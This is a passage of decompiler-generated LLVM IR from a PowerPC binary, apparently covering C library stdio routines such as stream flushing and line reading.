  %v0_10006a9c = load i32, i32* %r30.global-to-local, align 4
  ret i32 %v0_10006a9c

; uselistorder directives
  uselistorder i32 %v0_10006a68, { 2, 1, 0 }
  uselistorder i32 %v3_10006a58, { 0, 3, 1, 2 }
  uselistorder i32 %v0_10006a58, { 1, 0, 2 }
  uselistorder i32 %v3_10006a10, { 0, 3, 1, 2 }
  uselistorder i32 %v1_100069f0, { 1, 0, 2 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 (i8, i32, i32)* @function_10006ed0, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10006a98, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006a8c, { 1, 0 }
}

define i32 @function_10006ab0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10006ab0:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r29.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10006ab8 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %v0_10006ab8, i32* %r29.global-to-local, align 4
  %v2_10006ad8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006ad8, i32* @r3, align 4
  %v1_10006adc = add i32 %arg2, 52
  %v2_10006adc = inttoptr i32 %v1_10006adc to i32*
  %v3_10006adc = load i32, i32* %v2_10006adc, align 4
  %v3_10006ae8 = icmp eq i32 %v3_10006adc, 0
  store i1 %v3_10006ae8, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10006ae8, label %dec_label_pc_10006af0, label %dec_label_pc_10006afc

dec_label_pc_10006af0:                            ; preds = %dec_label_pc_10006ab0
  %v0_10006af0 = call i32 @function_10009200()
  %v0_10006af8 = call i32 @function_100091f8()
  %v0_10006afc.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10006b00.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10006afc

dec_label_pc_10006afc:                            ; preds = %dec_label_pc_10006ab0, %dec_label_pc_10006af0
  %v0_10006b00 = phi i32 [ %v0_10006ab8, %dec_label_pc_10006ab0 ], [ %v0_10006b00.pre, %dec_label_pc_10006af0 ]
  %v0_10006afc = phi i32 [ %arg2, %dec_label_pc_10006ab0 ], [ %v0_10006afc.pre, %dec_label_pc_10006af0 ]
  store i32 268462856, i32* @lr, align 4
  %v2_10006b04 = call i32 @function_10006ff4(i32 %v0_10006b00, i32 %v0_10006afc)
  store i32 %v2_10006b04, i32* %r31.global-to-local, align 4
  store i32 %v2_10006ad8, i32* @r3, align 4
  %v0_10006b14 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10006b14, label %dec_label_pc_10006b18, label %dec_label_pc_10006b1c

dec_label_pc_10006b18:                            ; preds = %dec_label_pc_10006afc
  %v0_10006b18 = call i32 @function_10009200()
  %v0_10006b20.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10006b1c

dec_label_pc_10006b1c:                            ; preds = %dec_label_pc_10006afc, %dec_label_pc_10006b18
  %v0_10006b20 = phi i32 [ %v2_10006b04, %dec_label_pc_10006afc ], [ %v0_10006b20.pre, %dec_label_pc_10006b18 ]
  %v1_10006b30 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10006ab8)
  %v9_10006b30 = extractvalue %0 %v1_10006b30, 7
  store i4 %v9_10006b30, i4* @cr4, align 1
  ret i32 %v0_10006b20

; uselistorder directives
  uselistorder i32 %v0_10006ab8, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @function_10006ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10006b1c, { 1, 0 }
  uselistorder label %dec_label_pc_10006afc, { 1, 0 }
}

define i32 @function_10006b3c() local_unnamed_addr {
dec_label_pc_10006b3c:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100091f8.205 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_100100fc.206 to i32), i32* @r29, align 4
  %v2_10006b60 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10006b60, i32* @r3, align 4
  %v0_10006b68 = call i32 @function_10009200()
  %v0_10006b70 = call i32 @function_100091f8()
  %v3_10006b78 = load i32, i32* @global_var_10010494.207, align 4
  %v3_10006b7c = icmp eq i32 %v3_10006b78, 1
  br i1 %v3_10006b7c, label %dec_label_pc_10006b84, label %dec_label_pc_10006c2c

dec_label_pc_10006b84:                            ; preds = %dec_label_pc_10006b3c
  %v3_10006b88 = load i32, i32* @global_var_10010498.208, align 4
  %tmp7 = icmp slt i32 %v3_10006b88, 1
  br i1 %tmp7, label %dec_label_pc_10006c2c, label %dec_label_pc_10006b94

dec_label_pc_10006b94:                            ; preds = %dec_label_pc_10006b84
  %v2_10006ba0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006ba0, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_10006bac = call i32 @function_10009200()
  %v0_10006bb4 = call i32 @function_100091f8()
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_10010438.227 to i32*), align 4
  store i32 %storemerge8, i32* @r29, align 4
  %v3_10006c0c11 = icmp eq i32 %storemerge8, 0
  %v0_10006c1012 = load i32, i32* @r30, align 4
  br i1 %v3_10006c0c11, label %dec_label_pc_10006c18, label %dec_label_pc_10006bc4

dec_label_pc_10006bc4:                            ; preds = %dec_label_pc_10006b94, %dec_label_pc_10006c0c.backedge
  %v0_10006c1017 = phi i32 [ %v0_10006c10, %dec_label_pc_10006c0c.backedge ], [ %v0_10006c1012, %dec_label_pc_10006b94 ]
  %v3_10006c1018.in = phi i32 [ %v0_10006c10, %dec_label_pc_10006c0c.backedge ], [ %v0_10006c1012, %dec_label_pc_10006b94 ]
  %storemerge16 = phi i32 [ %storemerge, %dec_label_pc_10006c0c.backedge ], [ %storemerge8, %dec_label_pc_10006b94 ]
  %v1_10006bc4 = inttoptr i32 %storemerge16 to i16*
  %v2_10006bc4 = load i16, i16* %v1_10006bc4, align 2
  %v1_10006bc8 = add i32 %storemerge16, 32
  %v2_10006bc8 = inttoptr i32 %v1_10006bc8 to i32*
  %v3_10006bc8 = load i32, i32* %v2_10006bc8, align 4
  store i32 %v3_10006bc8, i32* @r31, align 4
  %v1_10006bcc = and i16 %v2_10006bc4, -32720
  %v3_10006bd0 = icmp eq i16 %v1_10006bcc, 48
  br i1 %v3_10006bd0, label %dec_label_pc_10006be0, label %dec_label_pc_10006bd8

dec_label_pc_10006bd8:                            ; preds = %dec_label_pc_10006bc4
  store i32 %storemerge16, i32* @r30, align 4
  br label %dec_label_pc_10006c0c.backedge

dec_label_pc_10006be0:                            ; preds = %dec_label_pc_10006bc4
  %v3_10006c1018 = icmp eq i32 %v3_10006c1018.in, 0
  br i1 %v3_10006c1018, label %dec_label_pc_10006be4, label %dec_label_pc_10006bf0

dec_label_pc_10006be4:                            ; preds = %dec_label_pc_10006be0
  store i32 %v3_10006bc8, i32* bitcast (i32** @global_var_10010438.227 to i32*), align 4
  br label %dec_label_pc_10006bf4

dec_label_pc_10006bf0:                            ; preds = %dec_label_pc_10006be0
  %v2_10006bf0 = add i32 %v0_10006c1017, 32
  %v3_10006bf0 = inttoptr i32 %v2_10006bf0 to i32*
  store i32 %v3_10006bc8, i32* %v3_10006bf0, align 4
  %v0_10006bf4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10006bf4

dec_label_pc_10006bf4:                            ; preds = %dec_label_pc_10006be4, %dec_label_pc_10006bf0
  %v0_10006bf4 = phi i32 [ %storemerge16, %dec_label_pc_10006be4 ], [ %v0_10006bf4.pre, %dec_label_pc_10006bf0 ]
  %v1_10006bf4 = inttoptr i32 %v0_10006bf4 to i16*
  %v2_10006bf4 = load i16, i16* %v1_10006bf4, align 2
  store i32 %v0_10006bf4, i32* @r3, align 4
  %v1_10006bfc = and i16 %v2_10006bf4, 8192
  %v3_10006bfc = icmp eq i16 %v1_10006bfc, 0
  br i1 %v3_10006bfc, label %dec_label_pc_10006c0c.backedge, label %dec_label_pc_10006c04

dec_label_pc_10006c0c.backedge:                   ; preds = %dec_label_pc_10006bf4, %dec_label_pc_10006bd8, %dec_label_pc_10006c04
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_10006c0c = icmp eq i32 %storemerge, 0
  %v0_10006c10 = load i32, i32* @r30, align 4
  br i1 %v3_10006c0c, label %dec_label_pc_10006c18, label %dec_label_pc_10006bc4

dec_label_pc_10006c04:                            ; preds = %dec_label_pc_10006bf4
  store i32 268463112, i32* @lr, align 4
  %v0_10006c04 = call i32 @function_100081f8()
  br label %dec_label_pc_10006c0c.backedge

dec_label_pc_10006c18:                            ; preds = %dec_label_pc_10006c0c.backedge, %dec_label_pc_10006b94
  store i32 %v2_10006ba0, i32* @r3, align 4
  %v0_10006c20 = call i32 @function_10009200()
  %v0_10006c28 = load i32, i32* @r29, align 4
  store i32 %v0_10006c28, i32* @global_var_10010498.208, align 4
  %v3_10006c34.pre = load i32, i32* @global_var_10010494.207, align 4
  br label %dec_label_pc_10006c2c

dec_label_pc_10006c2c:                            ; preds = %dec_label_pc_10006b3c, %dec_label_pc_10006b84, %dec_label_pc_10006c18
  %v3_10006c34 = phi i32 [ %v3_10006b78, %dec_label_pc_10006b3c ], [ 1, %dec_label_pc_10006b84 ], [ %v3_10006c34.pre, %dec_label_pc_10006c18 ]
  store i32 %v2_10006b60, i32* @r3, align 4
  %v1_10006c3c = add i32 %v3_10006c34, -1
  store i32 %v1_10006c3c, i32* @global_var_10010494.207, align 4
  %v0_10006c44 = call i32 @function_10009200()
  ret i32 %v0_10006c44

; uselistorder directives
  uselistorder i32 %v0_10006c10, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10006bf4, { 1, 0 }
  uselistorder i32 %v3_10006bc8, { 1, 0, 2 }
  uselistorder i32 %storemerge16, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10006c2c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006c0c.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006bf4, { 1, 0 }
  uselistorder label %dec_label_pc_10006bc4, { 1, 0 }
}

define i32 @function_10006c5c(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10006c5c:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_10010438.227 to i32), i32* %r9.global-to-local, align 4
  %v5_10006c6c = icmp eq i16* %arg1, bitcast (i32** @global_var_10010438.227 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_10006c6c, label %dec_label_pc_10006c90, label %dec_label_pc_10006c84

dec_label_pc_10006c84:                            ; preds = %dec_label_pc_10006c5c
  %v4_10006c84 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_10006c84, label %dec_label_pc_10006c90, label %dec_label_pc_10006dbc

dec_label_pc_10006c90:                            ; preds = %dec_label_pc_10006c84, %dec_label_pc_10006c5c
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100091f8.205 to i32), i32* @r30, align 4
  %v2_10006c9c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006c9c, i32* @r3, align 4
  %v0_10006cb0 = call i32 @function_10009200()
  %v0_10006cb8 = call i32 @function_100091f8()
  %v3_10006cc0 = load i32, i32* @global_var_10010494.207, align 4
  store i32 %v2_10006c9c, i32* @r3, align 4
  %v1_10006cd0 = add i32 %v3_10006cc0, 1
  store i32 %v1_10006cd0, i32* %r9.global-to-local, align 4
  store i32 %v1_10006cd0, i32* @global_var_10010494.207, align 4
  %v0_10006cdc = call i32 @function_10009200()
  store i32 %v2_10006c9c, i32* @r3, align 4
  %v0_10006cec = call i32 @function_10009200()
  %v0_10006cf4 = call i32 @function_100091f8()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 %v2_10006c9c, i32* @r3, align 4
  %v3_10006d00 = load i32, i32* bitcast (i32** @global_var_10010438.227 to i32*), align 4
  store i32 %v3_10006d00, i32* @r31, align 4
  store i32 0, i32* @r28, align 4
  %v0_10006d0c = call i32 @function_10009200()
  %v0_10006dac.pr = load i32, i32* @r31, align 4
  %v3_10006dac3 = icmp eq i32 %v0_10006dac.pr, 0
  br i1 %v3_10006dac3, label %dec_label_pc_10006db4, label %dec_label_pc_10006d14

dec_label_pc_10006d14:                            ; preds = %dec_label_pc_10006c90, %dec_label_pc_10006da8
  %v0_10006d30 = phi i32 [ %v3_10006da8, %dec_label_pc_10006da8 ], [ %v0_10006dac.pr, %dec_label_pc_10006c90 ]
  %v1_10006d14 = inttoptr i32 %v0_10006d30 to i16*
  %v2_10006d14 = load i16, i16* %v1_10006d14, align 2
  %v3_10006d14 = zext i16 %v2_10006d14 to i32
  %v1_10006d18 = and i32 %v3_10006d14, 64
  store i32 %v1_10006d18, i32* %r9.global-to-local, align 4
  %v3_10006d18 = icmp eq i32 %v1_10006d18, 0
  br i1 %v3_10006d18, label %dec_label_pc_10006da8, label %dec_label_pc_10006d20

dec_label_pc_10006d20:                            ; preds = %dec_label_pc_10006d14
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_10006d24 = load i32, i32* @global_var_1001043c.225, align 4
  %v3_10006d28 = icmp eq i32 %v3_10006d24, 2
  br i1 %v3_10006d28, label %dec_label_pc_10006d4c, label %dec_label_pc_10006d30

dec_label_pc_10006d30:                            ; preds = %dec_label_pc_10006d20
  store i32 %v2_10006c9c, i32* @r3, align 4
  %v0_10006d40 = call i32 @function_10009200()
  %v0_10006d48 = call i32 @function_100091f8()
  %v0_10006d4c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006d4c

dec_label_pc_10006d4c:                            ; preds = %dec_label_pc_10006d20, %dec_label_pc_10006d30
  %v0_10006d60 = phi i32 [ %v0_10006d30, %dec_label_pc_10006d20 ], [ %v0_10006d4c.pre, %dec_label_pc_10006d30 ]
  %v1_10006d4c = inttoptr i32 %v0_10006d60 to i16*
  %v2_10006d4c = load i16, i16* %v1_10006d4c, align 2
  %v3_10006d4c = zext i16 %v2_10006d4c to i32
  %v0_10006d50 = load i32, i32* @r27, align 4
  %v2_10006d50 = or i32 %v0_10006d50, %v3_10006d4c
  %v1_10006d54 = and i32 %v2_10006d50, 832
  %v1_10006d58 = xor i32 %v1_10006d54, 320
  store i32 %v1_10006d58, i32* %r9.global-to-local, align 4
  %v3_10006d58 = icmp eq i32 %v1_10006d58, 0
  br i1 %v3_10006d58, label %dec_label_pc_10006d60, label %dec_label_pc_10006d8c

dec_label_pc_10006d60:                            ; preds = %dec_label_pc_10006d4c
  store i32 %v0_10006d60, i32* @r3, align 4
  store i32 268463464, i32* @lr, align 4
  %v0_10006d64 = call i32 @function_10005834()
  %v3_10006d68 = icmp eq i32 %v0_10006d64, 0
  br i1 %v3_10006d68, label %dec_label_pc_10006d78, label %dec_label_pc_10006d70

dec_label_pc_10006d70:                            ; preds = %dec_label_pc_10006d60
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10006d8c

dec_label_pc_10006d78:                            ; preds = %dec_label_pc_10006d60
  %v0_10006d78 = load i32, i32* @r31, align 4
  %v1_10006d78 = inttoptr i32 %v0_10006d78 to i16*
  %v2_10006d78 = load i16, i16* %v1_10006d78, align 2
  %v3_10006d78 = zext i16 %v2_10006d78 to i32
  %v1_10006d7c = add i32 %v0_10006d78, 8
  %v2_10006d7c = inttoptr i32 %v1_10006d7c to i32*
  %v3_10006d7c = load i32, i32* %v2_10006d7c, align 4
  store i32 %v3_10006d7c, i32* %r9.global-to-local, align 4
  %v1_10006d80 = call i32 @__asm_rlwinm(i32 %v3_10006d78, i32 0, i32 26, i32 24)
  %v2_10006d80 = trunc i32 %v1_10006d80 to i16
  %v1_10006d84 = load i32, i32* @r31, align 4
  %v2_10006d84 = add i32 %v1_10006d84, 28
  %v3_10006d84 = inttoptr i32 %v2_10006d84 to i32*
  store i32 %v3_10006d7c, i32* %v3_10006d84, align 4
  %v3_10006d88 = load i32, i32* @r31, align 4
  %v4_10006d88 = inttoptr i32 %v3_10006d88 to i16*
  store i16 %v2_10006d80, i16* %v4_10006d88, align 2
  br label %dec_label_pc_10006d8c

dec_label_pc_10006d8c:                            ; preds = %dec_label_pc_10006d4c, %dec_label_pc_10006d70, %dec_label_pc_10006d78
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_10006d90 = load i32, i32* @global_var_1001043c.225, align 4
  %v3_10006d94 = icmp eq i32 %v3_10006d90, 2
  br i1 %v3_10006d94, label %dec_label_pc_10006da8, label %dec_label_pc_10006d9c

dec_label_pc_10006d9c:                            ; preds = %dec_label_pc_10006d8c
  store i32 %v2_10006c9c, i32* @r3, align 4
  %v0_10006da4 = call i32 @function_10009200()
  br label %dec_label_pc_10006da8

dec_label_pc_10006da8:                            ; preds = %dec_label_pc_10006d8c, %dec_label_pc_10006d14, %dec_label_pc_10006d9c
  %v0_10006da8 = load i32, i32* @r31, align 4
  %v1_10006da8 = add i32 %v0_10006da8, 32
  %v2_10006da8 = inttoptr i32 %v1_10006da8 to i32*
  %v3_10006da8 = load i32, i32* %v2_10006da8, align 4
  store i32 %v3_10006da8, i32* @r31, align 4
  %v3_10006dac = icmp eq i32 %v3_10006da8, 0
  br i1 %v3_10006dac, label %dec_label_pc_10006db4, label %dec_label_pc_10006d14

dec_label_pc_10006db4:                            ; preds = %dec_label_pc_10006da8, %dec_label_pc_10006c90
  store i32 ptrtoint (i32* @global_var_10006db8.252 to i32), i32* @lr, align 4
  %v0_10006db4 = call i32 @function_10006b3c()
  br label %dec_label_pc_10006df4

dec_label_pc_10006dbc:                            ; preds = %dec_label_pc_10006c84
  %v3_10006dbc = load i16, i16* %arg1, align 2
  %v4_10006dbc = zext i16 %v3_10006dbc to i32
  store i32 0, i32* @r28, align 4
  %v1_10006dc4 = and i32 %v4_10006dbc, 64
  store i32 %v1_10006dc4, i32* %r9.global-to-local, align 4
  %v3_10006dc4 = icmp eq i32 %v1_10006dc4, 0
  br i1 %v3_10006dc4, label %dec_label_pc_10006df4, label %dec_label_pc_10006dcc

dec_label_pc_10006dcc:                            ; preds = %dec_label_pc_10006dbc
  store i32 268463568, i32* @lr, align 4
  %v0_10006dcc = call i32 @function_10005834()
  store i32 -1, i32* @r28, align 4
  %v3_10006dd4 = icmp eq i32 %v0_10006dcc, 0
  br i1 %v3_10006dd4, label %dec_label_pc_10006ddc, label %dec_label_pc_10006df4

dec_label_pc_10006ddc:                            ; preds = %dec_label_pc_10006dcc
  %v0_10006ddc = load i32, i32* @r29, align 4
  %v1_10006ddc = inttoptr i32 %v0_10006ddc to i16*
  %v2_10006ddc = load i16, i16* %v1_10006ddc, align 2
  %v3_10006ddc = zext i16 %v2_10006ddc to i32
  store i32 0, i32* @r28, align 4
  %v1_10006de4 = add i32 %v0_10006ddc, 8
  %v2_10006de4 = inttoptr i32 %v1_10006de4 to i32*
  %v3_10006de4 = load i32, i32* %v2_10006de4, align 4
  store i32 %v3_10006de4, i32* %r9.global-to-local, align 4
  %v1_10006de8 = call i32 @__asm_rlwinm(i32 %v3_10006ddc, i32 0, i32 26, i32 24)
  %v2_10006de8 = trunc i32 %v1_10006de8 to i16
  %v3_10006dec = load i32, i32* @r29, align 4
  %v4_10006dec = inttoptr i32 %v3_10006dec to i16*
  store i16 %v2_10006de8, i16* %v4_10006dec, align 2
  %v0_10006df0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006df0 = load i32, i32* @r29, align 4
  %v2_10006df0 = add i32 %v1_10006df0, 28
  %v3_10006df0 = inttoptr i32 %v2_10006df0 to i32*
  store i32 %v0_10006df0, i32* %v3_10006df0, align 4
  br label %dec_label_pc_10006df4

dec_label_pc_10006df4:                            ; preds = %dec_label_pc_10006dcc, %dec_label_pc_10006dbc, %dec_label_pc_10006db4, %dec_label_pc_10006ddc
  %v0_10006df8 = load i32, i32* @r28, align 4
  ret i32 %v0_10006df8

; uselistorder directives
  uselistorder i32 %v3_10006da8, { 1, 2, 0 }
  uselistorder i32 %v1_10006d58, { 1, 0 }
  uselistorder i32 %v2_10006c9c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32 ()* @function_10006b3c, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_10010438.227 to i32*), { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32* @global_var_10010494.207, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i16* %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10006df4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10006da8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006d8c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006d4c, { 1, 0 }
  uselistorder label %dec_label_pc_10006d14, { 1, 0 }
}

define i32 @function_10006e0c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10006e0c:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_10006eb4, label %dec_label_pc_10006e2c

dec_label_pc_10006e2c:                            ; preds = %dec_label_pc_10006e0c
  store i32 %tmp, i32* @r31, align 4
  %v2_10006e943 = add i32 %arg2, -1
  store i32 %v2_10006e943, i32* @r29, align 4
  %v4_10006e9c9 = icmp eq i32 %arg2, 1
  br i1 %v4_10006e9c9, label %dec_label_pc_10006ea0, label %dec_label_pc_10006e34

dec_label_pc_10006e34:                            ; preds = %dec_label_pc_10006e2c, %dec_label_pc_10006e94.backedge
  %v2_10006e50 = phi i32 [ %v2_10006e5012, %dec_label_pc_10006e94.backedge ], [ %tmp, %dec_label_pc_10006e2c ]
  %v0_10006e34 = phi i32 [ %v0_10006e98, %dec_label_pc_10006e94.backedge ], [ %arg3, %dec_label_pc_10006e2c ]
  %v1_10006e34 = add i32 %v0_10006e34, 16
  %v2_10006e34 = inttoptr i32 %v1_10006e34 to i32*
  %v3_10006e34 = load i32, i32* %v2_10006e34, align 4
  %v1_10006e38 = add i32 %v0_10006e34, 24
  %v2_10006e38 = inttoptr i32 %v1_10006e38 to i32*
  %v3_10006e38 = load i32, i32* %v2_10006e38, align 4
  %v2_10006e3c = add i32 %v3_10006e34, 1
  store i32 %v2_10006e3c, i32* %r11.global-to-local, align 4
  %v3_10006e40 = icmp ult i32 %v3_10006e34, %v3_10006e38
  %v5_10006e40 = icmp eq i32 %v3_10006e34, %v3_10006e38
  store i1 %v5_10006e40, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10006e40, label %dec_label_pc_10006e48, label %dec_label_pc_10006e64

dec_label_pc_10006e48:                            ; preds = %dec_label_pc_10006e34
  %v4_10006e34 = inttoptr i32 %v3_10006e34 to i8*
  %v3_10006e48 = load i8, i8* %v4_10006e34, align 1
  %v3_10006e4c = icmp eq i8 %v3_10006e48, 10
  store i1 %v3_10006e4c, i1* %cr7_eq.global-to-local, align 1
  %v3_10006e50 = inttoptr i32 %v2_10006e50 to i8*
  store i8 %v3_10006e48, i8* %v3_10006e50, align 1
  %v0_10006e54 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006e54 = load i32, i32* @r30, align 4
  %v2_10006e54 = add i32 %v1_10006e54, 16
  %v3_10006e54 = inttoptr i32 %v2_10006e54 to i32*
  store i32 %v0_10006e54, i32* %v3_10006e54, align 4
  %v0_10006e58 = load i32, i32* @r31, align 4
  %v1_10006e58 = add i32 %v0_10006e58, 1
  store i32 %v1_10006e58, i32* @r31, align 4
  %v0_10006e5c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10006e5c, label %dec_label_pc_10006ea0, label %dec_label_pc_10006e94.backedge

dec_label_pc_10006e64:                            ; preds = %dec_label_pc_10006e34
  %v1_10006e9810 = inttoptr i32 %v0_10006e34 to i16*
  store i32 268463720, i32* @lr, align 4
  %v5_10006e64 = call i32 @function_1000a828(i16* %v1_10006e9810, i32 %v3_10006e34)
  %v6_10006e64 = trunc i32 %v5_10006e64 to i8
  %v4_10006e68 = icmp eq i8 %v6_10006e64, -1
  store i1 %v4_10006e68, i1* %cr7_eq.global-to-local, align 1
  %v3_10006e70 = icmp eq i8 %v6_10006e64, 10
  store i1 %v3_10006e70, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10006e68, label %dec_label_pc_10006e78, label %dec_label_pc_10006e88

dec_label_pc_10006e78:                            ; preds = %dec_label_pc_10006e64
  %v0_10006e78 = load i32, i32* @r30, align 4
  %v1_10006e78 = inttoptr i32 %v0_10006e78 to i16*
  %v2_10006e78 = load i16, i16* %v1_10006e78, align 2
  %v1_10006e7c = and i16 %v2_10006e78, 8
  %v3_10006e7c = icmp eq i16 %v1_10006e7c, 0
  br i1 %v3_10006e7c, label %dec_label_pc_10006e78.dec_label_pc_10006ea0_crit_edge, label %dec_label_pc_10006eb4

dec_label_pc_10006e78.dec_label_pc_10006ea0_crit_edge: ; preds = %dec_label_pc_10006e78
  %v0_10006ea0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006ea0

dec_label_pc_10006e88:                            ; preds = %dec_label_pc_10006e64
  %v3_10006e88 = load i32, i32* @r31, align 4
  %v4_10006e88 = inttoptr i32 %v3_10006e88 to i8*
  store i8 %v6_10006e64, i8* %v4_10006e88, align 1
  %v0_10006e8c = load i32, i32* @r31, align 4
  %v1_10006e8c = add i32 %v0_10006e8c, 1
  store i32 %v1_10006e8c, i32* @r31, align 4
  %v0_10006e90 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10006e90, label %dec_label_pc_10006ea0, label %dec_label_pc_10006e94.backedge

dec_label_pc_10006e94.backedge:                   ; preds = %dec_label_pc_10006e88, %dec_label_pc_10006e48
  %v2_10006e5012 = phi i32 [ %v1_10006e8c, %dec_label_pc_10006e88 ], [ %v1_10006e58, %dec_label_pc_10006e48 ]
  %v0_10006e94 = load i32, i32* @r29, align 4
  %v2_10006e94 = add i32 %v0_10006e94, -1
  store i32 %v2_10006e94, i32* @r29, align 4
  %v0_10006e98 = load i32, i32* @r30, align 4
  %v4_10006e9c = icmp eq i32 %v0_10006e94, 1
  br i1 %v4_10006e9c, label %dec_label_pc_10006ea0, label %dec_label_pc_10006e34

dec_label_pc_10006ea0:                            ; preds = %dec_label_pc_10006e88, %dec_label_pc_10006e94.backedge, %dec_label_pc_10006e48, %dec_label_pc_10006e2c, %dec_label_pc_10006e78.dec_label_pc_10006ea0_crit_edge
  %v2_10006eac = phi i32 [ %v0_10006ea0.pre, %dec_label_pc_10006e78.dec_label_pc_10006ea0_crit_edge ], [ %tmp, %dec_label_pc_10006e2c ], [ %v1_10006e58, %dec_label_pc_10006e48 ], [ %v2_10006e5012, %dec_label_pc_10006e94.backedge ], [ %v1_10006e8c, %dec_label_pc_10006e88 ]
  %v1_10006ea0 = load i32, i32* @r28, align 4
  %v3_10006ea0 = icmp ugt i32 %v2_10006eac, %v1_10006ea0
  %v4_10006ea0 = icmp eq i32 %v2_10006eac, %v1_10006ea0
  store i1 %v4_10006ea0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10006ea0, label %dec_label_pc_10006ea8, label %dec_label_pc_10006eb4

dec_label_pc_10006ea8:                            ; preds = %dec_label_pc_10006ea0
  %v3_10006eac = inttoptr i32 %v2_10006eac to i8*
  store i8 0, i8* %v3_10006eac, align 1
  %v0_10006ebc.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10006eb8

dec_label_pc_10006eb4:                            ; preds = %dec_label_pc_10006e78, %dec_label_pc_10006ea0, %dec_label_pc_10006e0c
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10006eb8

dec_label_pc_10006eb8:                            ; preds = %dec_label_pc_10006ea8, %dec_label_pc_10006eb4
  %v0_10006ebc = phi i32 [ %v0_10006ebc.pre, %dec_label_pc_10006ea8 ], [ 0, %dec_label_pc_10006eb4 ]
  ret i32 %v0_10006ebc

; uselistorder directives
  uselistorder i32 %v2_10006eac, { 0, 2, 1 }
  uselistorder i8 %v6_10006e64, { 1, 0, 2 }
  uselistorder i32 %v3_10006e38, { 1, 0 }
  uselistorder i32 %v3_10006e34, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_10006e34, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10006eb8, { 1, 0 }
  uselistorder label %dec_label_pc_10006eb4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006ea0, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10006e34, { 1, 0 }
}

